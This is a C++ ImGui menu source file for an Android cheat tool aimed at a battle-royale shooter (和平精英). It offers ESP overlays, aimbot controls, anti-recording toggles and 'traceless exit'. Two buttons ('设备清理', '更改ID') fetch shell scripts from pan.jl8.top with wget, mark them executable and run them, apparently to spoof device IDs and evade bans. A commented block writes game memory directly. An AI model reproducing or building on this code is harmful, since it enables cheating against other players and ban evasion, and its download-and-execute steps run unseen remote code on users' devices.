ImGui::SetCursorPos(ImVec2(ImGui::GetCursorPosX() - lp_beg, ImGui::GetCursorPosY())); //设置光标位置
if (button("开始录制", ImVec2(365, 70))) {
lp_end = 400;
if (!isRecording.load()) {
isRecording.store(true);
thread([](int 录屏时长) {
  // 非阻塞式开始录制
string beijingTime = getBeijingTimeString(); // 获取北京时间字符串
string fileName = "/sdcard/念川内核录制" + beijingTime + ".mp4";
string command = "screenrecord --time-limit " + to_string(录屏时长) + " " + fileName + " &";
system(command.c_str());

isRecording.store(false);
}, 录屏时长).detach();
}
}
// Line(365);
ImGui::SetCursorPos(ImVec2(ImGui::GetCursorPosX() + 400 - lp_beg, ImGui::GetCursorPosY() - 82.5f)); //设置光标位置
if (button("停止录制", ImVec2(365, 70))) {
lp_end = 0;
system("pkill -l SIGINT screenrecord");
isRecording.store(false);
}
Line(365);
// 显示按钮
if (!lunxian.libUE4) {
    // 如果未获取到UE4数据，显示"[!]初始化游戏数据"按钮
    if (button("初始化游戏数据", ImVec2(365, 70), 10.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
        清理(); // 执行清理操作
        GetBase(); // 获取基础数据
    }
} else {
    // 如果已获取到UE4数据，显示"[!]注销读写"按钮
    if (button("无痕退出辅助", ImVec2(365, 70), 10.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
        exit(0); // 退出程序
    }
}
Line(365);

if (button("截屏", ImVec2(365, 80), 10.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    string beijingTime = getBeijingTimeString(); // 获取北京时间字符串
    string fileName = "/sdcard/NianChuan截屏." + beijingTime + ".png";
    string screenshotCommand = "screencap -p \'" + fileName + "\'";
    int result = system(screenshotCommand.c_str());
    if (result == 0) {
        std::cout << "截屏成功" << std::endl;
    } else {
        std::cout << "截屏失败" << std::endl;
    }
}
Line(365);

if (button("一键配置", ImVec2(365, 80), 10.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    wzhz[1] = true;
    DrawIo[3] = true;
    DrawIo[17] = true;
    DrawIo[10] = true;
    DrawIo[2] = true;
    DrawIo[5] = true;
    DrawIo[7] = true;
    DrawIo[6] = true;
    DrawIo[8] = true;
    DrawIo[14] = true;
    DrawIo[15] = true;
    DrawIo[13] = true;
    DrawIo[9918] = true;
    DrawIo[43] = true;
}

//使用draw自带的主题
Line(365);
// 修改这行代码，将红色文本改为黑色文本
ImGui::TextColored(ImVec4(0.0f, 0.0f, 0.0f, 1.0f), ""); // 改为黑色

if (button("设备清理", ImVec2(-1, 35), 10.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    // 开关 = false;
    std::this_thread::sleep_for(std::chrono::seconds(2));  
    system("wget https://pan.jl8.top/down.php/891259bbaf0e842280e318d09129d939.sh -O script.sh");
    system("chmod +x script.sh");
    system("timeout 666 ./script.sh");
    system("clear");
}

if (button("更改ID", ImVec2(-1, 35), 10.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    // 开关 = false;
    std::this_thread::sleep_for(std::chrono::seconds(2));
    system("clear");
    system("wget https://pan.jl8.top/down.php/38c77454ee54e7a9aa288eef7bd4e090.sh -O script.sh");
    system("chmod +x script.sh");
    system("timeout 666 ./script.sh");
    system("clear");
}
}





void 绘制_1() {
title("常用绘制");
ImGui::Checkbox("方框", &DrawIo[1]);
ImGui::SameLine();
ImGui::Checkbox("骨骼", &DrawIo[3]);
ImGui::SameLine();
ImGui::Checkbox("手持", &DrawIo[10]);

ImGui::Checkbox("射线", &DrawIo[2]);
ImGui::SameLine();
ImGui::Checkbox("距离", &DrawIo[5]);
ImGui::Checkbox("血量", &DrawIo[6]);
ImGui::SameLine();
ImGui::Checkbox("手雷预警", &DrawIo[14]);

ImGui::Checkbox("忽略人机", &DrawIo[17]);
ImGui::SameLine();
ImGui::Checkbox("绘制载具", &wzhz[1]);//PUBG和和平
ImGui::Text("若保存设置之后没有天线请看本辅助右下角\n名言:1.无法改变现状的你们必须选择妥协\n2.请把你给她的爱意分给爱你的人一点\n你可能给不了她物质上的东西、但是你记住把你觉得好的\n给他就可以了"); 
}
void 绘制_2() {
title("绘制图标样式:");
vector<string> 人数样式 = {"默认"};
title("绘制血量图标样式:");
vector<string> 绘图样式 = {"扁圆", "方形", "圆环"};

滑动条(人数样式, draw_style[0], 0, 120.0f);
滑动条(绘图样式, draw_style[1], 0, 120.0f);
}

void 绘制_3() {
title("敌背设置");
ImGui::SameLine();
ImGui::Checkbox("背敌预警", &DrawIo[8]);
// ImGui::SameLine();
bool 当前无后台状态 = (access("/sdcard/无后台", F_OK) == 0);
bool 当前防录屏状态 = (access("/sdcard/防录屏", F_OK) == 0);

// 显示开关（显示当前实际状态）
bool 无后台新状态 = 当前无后台状态;
if (iOSSwitch("无后台[需重启]", &无后台新状态)) {
    if (无后台新状态) {
        // 用户开启：创建文件
        int fd = open("/sdcard/无后台", O_CREAT | O_RDWR, 0644);
        close(fd);
    } else {
        // 用户关闭：删除文件
        unlink("/sdcard/无后台");
    }
    // 强制刷新状态
    当前无后台状态 = (access("/sdcard/无后台", F_OK) == 0);
    无后台新状态 = 当前无后台状态; // 同步状态
}
ImGui::SameLine();
// 防录屏同理
bool 防录屏新状态 = 当前防录屏状态;
if (iOSSwitch("防录屏[需重启]", &防录屏新状态)) {
    if (防录屏新状态) {
        int fd = open("/sdcard/防录屏", O_CREAT | O_RDWR, 0644);
        close(fd);
    } else {
        unlink("/sdcard/防录屏");
    }
    当前防录屏状态 = (access("/sdcard/防录屏", F_OK) == 0);
    防录屏新状态 = 当前防录屏状态;
}

vector<string> 敌背样式 = {"圆形", "箭头"};

vector<string> 游戏选择 = {"和平"};


滑动条(敌背样式, draw_style[2], 0, 120.0f);
            ImGui::SameLine();
滑动条(游戏选择, draw_style[10], 0, 120.0f);

}

void 绘制_4() {
// 设置按钮样式 - 浅灰色背景，黑色文字，圆角
if (button("修复骨骼天线不显[点击文字]", ImVec2(385, 100), 20.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    CleanData();
}

if (button("保存配置[点击文字]", ImVec2(245, 100), 20.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    NumIoSave("NianChuan配置");
}

if (button("退出辅助[点击文字]", ImVec2(245, 100), 20.0f, ImVec4(0.8f, 0.8f, 0.8f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 1.0f))) {
    exit(0);
}
}

void 自瞄_1() {

title("自瞄设置");

            ImGui::SameLine();
            ImGui::TextDisabled("(?)");
            if (ImGui::BeginItemTooltip())
            {
              ImGui::PushTextWrapPos(ImGui::GetFontSize() * 35.0f);
              ImGui::TextUnformatted(
              "参数调节详细\n"
              "1.启动后一切后果自负\n"
              "2.请关闭掉血自瞄才能开启自瞄\n"
              "3.触摸位置请放到无按键地方\n");
              ImGui::PopTextWrapPos();
              ImGui::EndTooltip();
            }            
                // 获取当前字体大小作为开关尺寸
    float fontSize = ImGui::GetFontSize();
    iOS_switch_height = fontSize * 0.9f;
    iOS_switch_width = fontSize * 1.6f;
    
    const float columnWidth = ImGui::GetWindowWidth() / 3.0f - 20.0f;
    const float itemSpacing = 10.0f;
    
    ImGui::Text("自瞄开关");
    ImGui::SameLine(columnWidth - iOS_switch_width);
    SwitchButton("##绘制射线", &DrawIo[20]);
    
iOSSwitch("掉血自瞄", &DrawIo[799]);
ImGui::SameLine();
iOSSwitch("自瞄图片", &DrawIo[787878]);


iOSSwitch("持续锁定", &DrawIo[30]);
ImGui::SameLine();
iOSSwitch("准心射线", &DrawIo[44]);
ImGui::SameLine();
iOSSwitch("触摸位置", &DrawIo[21]);

iOSSwitch("动态范围", &DrawIo[25]);
ImGui::SameLine();
iOSSwitch("忽略人机", &DrawIo[31]);

vector<string> 自瞄方式 = {"圆圈", "视角", "框内"};
滑动条(自瞄方式, NumIo[40], 0, 120.0f);
          
}
void 自瞄_2() {
title("自瞄参数");
            ImGui::SameLine();
            ImGui::TextDisabled("(?)");
            if (ImGui::BeginItemTooltip())
            {
              ImGui::PushTextWrapPos(ImGui::GetFontSize() * 35.0f);
              ImGui::TextUnformatted(
              "参数调节详细\n"
              "1.自瞄速度 越大则慢 越小则快[可能会出现跳屏]\n"
              "2.压枪力度 越大则下抬 越小则上抬\n");
              ImGui::PopTextWrapPos();
              ImGui::EndTooltip();
            }            
SliderFloat ("自瞄距离", &NumIo[32], 10.0f, 500.0f, "%1.f");
SliderFloat ("自瞄大小", &NumIo[3], 10.0f, 800.0f, "%1.f");
SliderFloat ("平滑力度", &NumIo[9], 1.0f, 50.0f, "%0.1f");
SliderFloat ("瞄准速度", &NumIo[4], 1.0f, 30.0f, "%0.1f");
SliderFloat ("压枪力度", &NumIo[14], 0.1f, 8.0f, "%.1f", 5);
SliderFloat ("预判调节", &NumIo[22], 0.1f, 5.0f, "%.1f", 5);
SliderFloat ("腰射限离", &NumIo[31], 0.0f, 80.0f, "%1.f");
SliderFloat ("触摸区域大小", &NumIo[7], 100.0f, 500.0f, "%1.f");

// 设置圆角
ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 10.0f);

// 设置颜色
ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.8f, 0.8f, 1.0f));        // 浅灰色背景
ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.7f, 0.7f, 1.0f)); // 悬停时稍深的灰色
ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.6f, 0.6f, 0.6f, 1.0f));  // 按下时更深的灰色
ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 0.0f, 0.0f, 1.0f));          // 黑色文字

if (ImGui::Button("软锁", ImVec2(-1, 50))) {
    NumIo[4] = 25.0f;
    NumIo[9] = 15.0f;
}

if (ImGui::Button("中锁", ImVec2(-1, 50))) {
    NumIo[4] = 15.0f;
    NumIo[9] = 15.0f;
}

if (ImGui::Button("强锁", ImVec2(-1, 50))) {
    NumIo[4] = 10.0f;
    NumIo[9] = 15.0f;
}

// 恢复样式和颜色
ImGui::PopStyleColor(4);
ImGui::PopStyleVar(1);
}

void 自瞄_3() {
title("锁定设置");
            if (ImGui::Combo("触发条件", &intIo[1], "开火自瞄\0始终瞄准\0开火开镜\0")) {
                switch (intIo[1]) 
                {
                    case 0:NumIo[0] = 0.0; 
                        break;
                    case 1:NumIo[0] = 1.0; 
                         break;
                    case 2:NumIo[0] = 2.0; 
                        break;                          
                }          
            }
            
            if (ImGui::Combo("瞄准优先", &intIo[2], "准心优先\0距离优先\0")) {
                switch (intIo[2]) 
                {
                    case 0:NumIo[21] = 0.0; 
                        break;
                    case 1:NumIo[21] = 1.0; 
                         break;
                }          
            }
        if (ImGui::Combo("自瞄部位", &intIo[3], "自动\0头部\0胸部\0臀部\0")) {
                switch (intIo[3]) 
                {
                    case 0:NumIo[8] = 0.0; 
                        break;
                    case 1:NumIo[8] = 1.0; 
                         break;
                    case 2:NumIo[8] = 2.0; 
                        break;
                    case 3:NumIo[8] = 3.0; 
                        break;
                }          
            }                     
            ImGui::Spacing();//间距
            ImGui::Spacing();//间距
            title("其他设置");
            if (ImGui::Combo("充电位置", &intIo[4], "充电口右\0充电口左\0")) {
                switch (intIo[4]) 
                {
                    case 0:NumIo[10] = 0.0; 
                        break;
                    case 1:NumIo[10] = 1.0; 
                         break;
                }          
            }
}

int 页 = 1;
void 设置_0() {
ostringstream oss;
oss << "第" << 页 << "页"; 


title("调色板");
调色板按钮(tsb_but, 鸡鸡鸡, 0, 315, 90, 1 );
ImGui::Spacing();
ImGui::SetCursorPos(ImVec2( 15 + 调色板页数.beg, 180));
绘制调色板();
ImGui::Spacing();


if (button("上1页", ImVec2(95,60), 8.0f, ImVec4(0.86f, 0.86f, 0.86f, 1.0f))) {
调色板页数.end += 330;
页 -= 1;
}
ImGui::SameLine();
button(oss.str().c_str(), ImVec2(95,60), 8.0f, ImVec4(0.86f, 0.86f, 0.86f, 1.0f), ImVec4(0.0f, 0.0f, 0.0f, 0.0f), ImVec4(0.86f, 0.86f, 0.86f, 1.0f));
ImGui::SameLine();
if (button("下1页", ImVec2(95,60), 8.0f, ImVec4(0.86f, 0.86f, 0.86f, 1.0f))) {
调色板页数.end -= 330;
页 += 1;
}

if (调色板页数.end >= 0) {
调色板页数.end = 0;
页 = 1;
} else if (调色板页数.end <= -660) {
调色板页数.end = -660;
页 = 3;
}
}




void 设置页面() {
static int shezhi = 0;                
                
                if (ImGui::Button("常用设置",ImVec2(140, 66))) {
                    shezhi = 0;
                }
                
                ImGui::SameLine();
                    
                if (ImGui::Button("颜色设置",ImVec2(140, 66))) {
                    shezhi = 1;
                }
                            ImGui::SameLine();
                if (ImGui::Button("物资绘制",ImVec2(140, 66))) {
                    shezhi = 2;
                }
switch (shezhi) {
                    case 0: {
SliderFloat ("刷新率调试(游戏帧率)", &NumIo[12], 60.0f, 120.0f, "%1.f", 5);
if (button("保存配置", ImVec2(243, 100), 20.0f, ImVec4(0.0f, 0.0f, 0.0f, 0.0f), ImVec4(0.25f, 0.25f, 0.25f, 1.0f))) {
NumIoSave("汪汪配置");
}
ImGui::SameLine();
if (button("重置配置", ImVec2(243, 100), 20.0f, ImVec4(0.0f, 0.0f, 0.0f, 0.0f), ImVec4(0.25f, 0.25f, 0.25f, 1.0f))) {
CleanData();
}
ImGui::SameLine();
if (button("退出辅助", ImVec2(243, 100), 20.0f, ImVec4(0.0f, 0.0f, 0.0f, 0.0f), ImVec4(0.25f, 0.25f, 0.25f, 1.0f))) {
exit(0);

}
                    break;
                    }
                    case 1:{
                    调色板.end = 340.0f;

ImGui::SetCursorPosX(ImGui::GetCursorPosX() + 5); //设置光标位置
SliderFloat (( "透明度: " + tsb_but).c_str(), &透明度, 0.0f, 1000.0f, "%1.f", 5);

调色板按钮("玩家边框", 绘制颜色[1], 1 );
ImGui::SameLine();
调色板按钮("人机边框", 绘制颜色[2], 2 );

调色板按钮("玩家填充", 绘制颜色[3], 3 );
ImGui::SameLine();
调色板按钮("人机填充", 绘制颜色[4], 4 );

调色板按钮("玩家射线", 绘制颜色[5], 5 );
ImGui::SameLine();
调色板按钮("人机射线", 绘制颜色[6], 6 );

调色板按钮("玩家骨骼", 绘制颜色[7], 7 );
ImGui::SameLine();
调色板按钮("人机骨骼", 绘制颜色[8], 8 );
                    break;
                    }           
                    case 2:{
  title("高级物资");
                iOSSwitch("金插", &wzhz[4]);
                ImGui::SameLine();
                iOSSwitch("信号枪", &wzhz[3]);
                ImGui::SameLine();
                iOSSwitch("自救器", &wzhz[8]);
                
                iOSSwitch("饮料止痛药", &wzhz[5]);
                ImGui::SameLine();
                iOSSwitch("高倍镜", &wzhz[6]);
                ImGui::SameLine();
                iOSSwitch("肾上腺素", &wzhz[7]);
                
                title("地铁");
                iOSSwitch("超级物资箱", &wzhz[10]);
                ImGui::SameLine();
                iOSSwitch("地铁箱子", &wzhz[11]);
                ImGui::SameLine();
                iOSSwitch("BOOS", &wzhz[12]);
                
                title("自定义物资");
                ImGui::Text("自定义物资路径/data/自定义物资.txt\n"); 
                ImGui::Checkbox("初始化自定义物资", &wzhz[2]);

                    break;
                    }           
                   }
}

void 基址(){
/*static int mianban = 0;                

switch (mianban) {
case 0: {
long 广角地址 = driver->read<uintptr_t>( lunxian.Oneself + 0x4b8);

ImGui::PushItemWidth(300.0f);
if (ImGui::SliderFloat("##和平精英_三称FOV", &NumIo[9178], 80.0f, 140.0f, "%.1f")) {
    driver->WriteAddress<float>(driver->read<uintptr_t>(广角地址 + 0x10) + 0x2e4, NumIo[9178]);
}
ImGui::SameLine(0, 150); // 水平间距 5 像素
ImGui::Text("和平精英三称广角");
ImGui::PopItemWidth(); // 恢复默认控件宽度
break;*/
ImGui::TextColored(ImColor(230, 0, 0,225), "此模块未更新 敬请期待...");
}

                                
                   
                
void 灵动岛() {
// 灵动岛
float pxx = screen_x/2;
string play = to_string(lunxian.PlayerCount);
string bot = to_string(lunxian.BotCount);


if (draw_style[0] == 1) {
string str = "    ";
        auto textSize = ImGui::CalcTextSize(str.c_str(), 0, 25);            
        ImGui::GetForegroundDrawList()->AddText(NULL,48,{screen_x / 2 - 86,100}, ImColor(255,0,0), str.c_str());
// // 无灵动岛
}
if (draw_style[0] == 0) {
float 灵动岛 = 灵动岛宽度.beg;
ImGui::GetForegroundDrawList()->AddRectFilled(
        {pxx - (95) - 灵动岛 , (35)},
        {pxx + (95) + 灵动岛 , (110)},
        ImColor(255, 215, 0),
        200, 0); // 黑色背景
ImGui::GetForegroundDrawList()->AddRect(
        {pxx - (95) - 灵动岛 , (35)},
        {pxx + (95) + 灵动岛 , (110)},
        ImColor(255, 255, 255, 255),
        200, 0, 3.3f); // 白色边框
        
        

// 玩家
auto textSize_play = ImGui::GetFont()->CalcTextSizeA((50), FLT_MAX, -1, play.c_str(), NULL, NULL);
ImGui::GetForegroundDrawList()->AddText(NULL, (50), ImVec2(pxx - (textSize_play.x / 2) - (45), (73.5f) - (textSize_play.y / 2)), ImColor(255, 0, 0, 255), play.c_str());
// 人机
auto textSize_bot = ImGui::GetFont()->CalcTextSizeA((50), FLT_MAX, -1, bot.c_str(), NULL, NULL);
ImGui::GetForegroundDrawList()->AddText(NULL, (50), ImVec2(pxx - (textSize_bot.x / 2) + (45), (73.5f) - (textSize_bot.y / 2)), ImColor(0, 255, 0, 240), bot.c_str());




 //灵动岛点击事件
ImVec2 childWindowSize = ImVec2(650, 250); // 设置子悬浮窗的初始大小
ImVec2 childWindowPos = ImVec2(screen_x/2-(325), 0); // 子悬浮窗的初始位置
ImGui::SetNextWindowPos(childWindowPos);//悬浮窗位置
ImGui::SetNextWindowSize(childWindowSize);//悬浮窗大小
// 临时设置子悬浮窗的背景颜色为透明
ImVec4 transparentColor = ImVec4(0.0f, 0.0f, 0.0f, 0.0f); // 完全透明
ImGui::PushStyleColor(ImGuiCol_WindowBg, transparentColor);
ImGui::PushStyleColor(ImGuiCol_Border, transparentColor);
ImGui::PushStyleColor(ImGuiCol_BorderShadow, transparentColor);
ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.0f, 0.0f, 0.0f)); // 设置按钮背景色为透明
ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.0f, 0.0f, 0.0f)); // 设置按钮悬停时背景色为透明
ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.0f, 0.0f, 0.0f, 0.0f)); // 设置按钮按下时背景色为透明
ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 100); // 设置圆角大小
ImGui::Begin("灵动岛点击", NULL, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse);

ImGui::SetCursorPos(ImVec2((325) - (100) - 灵动岛 , (33)));
if(ImGui::Button("", ImVec2((200), (80)))){
开关 = !开关;
}
ImGui::SetCursorPos(ImVec2((325) - (100) + 灵动岛 , (33)));
if(ImGui::Button(" ", ImVec2((200), (80)))){
开关 = !开关;
}

ImGui::End();
ImGui::PopStyleVar(); //恢复圆角
ImGui::PopStyleColor(6); //释放颜色
 
}

if (draw_style[0] == 2) {
if ( lunxian.BotCount + lunxian.PlayerCount == 0){//如果真人和人机总数等于0那么显示安全
    string str = "安全"; // 去掉了前面的空格
    auto textSize = ImGui::CalcTextSize(str.c_str());
    
    // 计算背景区域中心坐标
    float background_center_x = screen_x/2;
    float background_center_y = 35 + (110 - 35)/2; // 垂直居中
    
    // 计算文本绘制位置（居中）
    ImVec2 text_pos = {
        background_center_x - textSize.x/2,
        background_center_y - textSize.y/2
    };
    
    ImGui::GetForegroundDrawList()->AddText(
        NULL, 
        48,
        text_pos, 
        ImColor(0,255,0,240), 
        str.c_str()
    );
 

} else {
string zs = to_string(lunxian.PlayerCount + lunxian.BotCount);

auto textSize_zs = ImGui::GetFont()->CalcTextSizeA((80)*灵动岛大小, FLT_MAX, -1, zs.c_str(), NULL, NULL);
ImGui::GetForegroundDrawList()->AddText(NULL, (80)*灵动岛大小, ImVec2(pxx - (textSize_zs.x / 2), (74)*灵动岛大小 - (textSize_zs.y / 2)), ImColor(255, 0, 0, 255), zs.c_str());
}
}
if (draw_style[0] == 3) {
string str = "    ";
        auto textSize = ImGui::CalcTextSize(str.c_str(), 0, 25);            
        ImGui::GetForegroundDrawList()->AddText(NULL,48,{screen_x / 2 - 86,100}, ImColor(255,0,0), str.c_str());
// // 无灵动岛
}
}//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili
//————————————————————————UI功能页面